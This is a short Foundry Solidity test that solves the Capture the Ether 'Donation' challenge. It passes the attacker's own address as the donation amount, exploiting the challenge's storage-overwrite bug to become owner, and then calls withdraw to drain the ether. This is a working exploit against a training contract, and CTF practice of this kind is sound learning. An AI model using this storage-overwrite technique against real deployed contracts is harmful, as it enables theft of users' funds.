// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test} from "forge-std/Test.sol";

interface IDonationChallenge {
    function isComplete() external view returns (bool);
    function donate(uint256 etherAmount) external payable; 
    function withdraw() external;
}

contract TestDonationChallenge is Test {
    IDonationChallenge challenge;
    address deployer;
    address user;

    function setUp() external {
        deployer = address(1);
        user = address(2);

        vm.deal(deployer, 1 ether);
        vm.deal(user, 1 ether);
        vm.prank(deployer);
        
        address challengeAddress = deployCode("DonationChallenge.sol:DonationChallenge", 1 ether);
        challenge = IDonationChallenge(challengeAddress);
    }

    function testIsComplete() external {
        vm.startPrank(user);
        uint256 amount = uint256(user);

        challenge.donate{value: amount / 10**36}(amount);
        challenge.withdraw();
        vm.stopPrank();

        assert(challenge.isComplete());
    }
}
